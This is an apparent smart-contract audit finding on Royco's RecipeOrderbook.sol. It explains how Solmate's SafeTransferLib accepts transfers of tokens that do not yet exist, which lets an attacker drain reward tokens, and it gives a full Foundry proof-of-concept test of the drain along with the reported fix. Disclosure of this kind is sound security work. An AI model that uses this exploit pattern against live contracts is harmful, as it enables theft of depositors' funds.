---
tags:
  - lang/solidity
  - sector/farm
  - platform/cantina
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - impact/loss-of-funds/reward-theft
  - impact/mev/frontrun
protocol: "[[Royco]]"
auditors:
  - "[[Kurt Barry]]"
report: "https://cdn.cantina.xyz/reports/cantina_royco_august2024.pdf"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[reward-theft]]"
  - "[[frontrun]]"
  - "[[frontrun-exposure]]"
  - "[[reward-accounting]]"
  - "[[timestamp-dependence]]"
---
# Successful transfers on non-existent tokens allows attackers to steal 

- id: 46673
- impact: HIGH
- protocol: [[Royco]]
- reporter: Kurt Barry (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_royco_august2024.pdf

## Summary


The bug report describes a problem with Solmate's SafeTransferLib, which is used to transfer tokens in a smart contract. The bug allows an attacker to steal all the reward tokens in the contract by taking advantage of a loophole in the code. The attacker can create a market and an IP order with a high amount of reward tokens before the token is deployed. Then, when the token is actually deployed, the attacker can match their own IP order with their own LP order to steal all the reward tokens in the contract.

To fix this issue, a check was added to ensure that the token exists before pulling from the user. This was done in commit 8313a51e, with a small compile-fix added in commit e553f190. The bug has been fixed by Cantina Managed.

## Details

## Vulnerability Report: RecipeOrderbook.sol

## Context
- `RecipeOrderbook.sol#L383`
- `RecipeOrderbook.sol#L534`

## Description
Solmate's `SafeTransferLib` succeeds even if the token address does not have any code. This opens up a potential exploit, which an attacker can take advantage of:

1. **Market Creation**: 
   - The attacker creates a market and places an IP order with a high amount of reward tokens before the token is deployed.
   - This succeeds because the contract calls `safeTransferFrom` on a non-existent token, which succeeds for any amount due to the lack of a code size check in `SafeTransferLib`.

2. **Token Deployment**: 
   - The token is actually deployed after the attacker's actions.

3. **Genuine Market Creation**: 
   - A genuine user creates a market and places an IP order with actual reward tokens.

4. **Matching Orders**: 
   - The attacker matches their own IP order with their own LP order to steal all the reward tokens in the contract.

This attack requires knowledge of where a token will be deployed before it is actually deployed. There are multiple ways to gain this knowledge, but the easiest way is to front-run the token deployment transaction.

## Proof of Concept
Add the following code in `test/RecipeOrderbook.t.sol` and run the test.

```solidity
contract DeterminsticTokenFactory {
    function deploy(uint256 _salt) public payable returns (address) {
        return address(new MockERC20{ salt: bytes32(_salt) }("Name", "Symbol"));
    }

    function getBytecode() public view returns (bytes memory) {
        bytes memory bytecode = type(MockERC20).creationCode;
        return abi.encodePacked(bytecode, abi.encode("Name", "Symbol"));
    }

    function getAddress(uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff), // 0
                address(this), // address of factory contract
                _salt, // a random salt
                keccak256(getBytecode()) // the wallet contract bytecode
            )
        );
        return address(uint160(uint256(hash)));
    }
}

function testNonExistentTokenBug() public {
    DeterminsticTokenFactory determinticTokenFactory = new DeterminsticTokenFactory();
    address attacker = address(0xA);
    uint256 salt = 1;
    MockERC20 rewardToken = MockERC20(determinticTokenFactory.getAddress(salt));
    assertEq(address(rewardToken).code.length, 0);

    // 1. Attacker creates some market and places an IP order with high amount of reward tokens before the token is deployed
    // This succeeds due to no code size check in safeTransferLib
    vm.startPrank(attacker);
    RecipeOrderbook.Recipe memory depositRecipe = RecipeOrderbook.Recipe(new bytes32[](0), new bytes[](0));
    RecipeOrderbook.Recipe memory withdrawRecipe = RecipeOrderbook.Recipe(new bytes32[](0), new bytes[](0));
    orderbook.createMarket(
        address(mockToken),
        1 days,
        0.002e18, // 0.2% frontend fee
        depositRecipe,
        withdrawRecipe,
        RewardStyle.Upfront
    );

    address[] memory tokensOffered = new address[](1);
    tokensOffered[0] = address(rewardToken);
    uint256[] memory tokenAmounts = new uint256[](1);
    tokenAmounts[0] = 100 ether;
    uint256 DUST_AMOUNT_OF_LP_TOKENS = 1;
    uint256 attackerOrderId = orderbook.createIPOrder(
        0, // marketId
        DUST_AMOUNT_OF_LP_TOKENS, // quantity
        block.timestamp + 1 days, // expiry
        tokensOffered,
        tokenAmounts
    );
    vm.stopPrank();

    // 2. Now the token actually gets deployed
    rewardToken = MockERC20(determinticTokenFactory.deploy(salt));
    assertGt(address(rewardToken).code.length, 0);

    // 3. A genuine user creates a genuine market and places an IP order with actual reward tokens
    orderbook.createMarket(
        address(mockToken),
        1 days,
        0.002 ether, // 0.2% frontend fee
        depositRecipe,
        withdrawRecipe,
        RewardStyle.Upfront
    );
    rewardToken.mint(address(this), 1000 ether);
    rewardToken.approve(address(orderbook), 1000 ether);
    tokensOffered[0] = address(rewardToken);
    tokenAmounts[0] = 100 ether;
    orderbook.createIPOrder(
        0, // marketId
        100 ether, // quantity
        block.timestamp + 1 days, // expiry
        tokensOffered,
        tokenAmounts
    );
    assertEq(rewardToken.balanceOf(address(orderbook)), 99 ether);

    // 4. Attacker matches their order with LP tokens to steal all of the reward tokens
    vm.startPrank(attacker);
    mockToken.mint(attacker, DUST_AMOUNT_OF_LP_TOKENS);
    mockToken.approve(address(orderbook), DUST_AMOUNT_OF_LP_TOKENS);
    orderbook.fillIPOrder(attackerOrderId, DUST_AMOUNT_OF_LP_TOKENS, address(mockVault), user2);
    vm.stopPrank();
    assertEq(rewardToken.balanceOf(attacker), 99 ether - 0.2 ether);
    assertEq(rewardToken.balanceOf(address(orderbook)), 0.2 ether); // Only frontend fee remains in the contract now. Everything else has been stolen.
}
```

## Recommendation
Add a check to ensure the token exists before pulling from the user.

**Royco**: Added a check to ensure the token exists in commit `8313a51e` and implemented a small compile-fix in commit `e553f190`, adding an actual error for the issue.

**Cantina Managed**: Fixed.
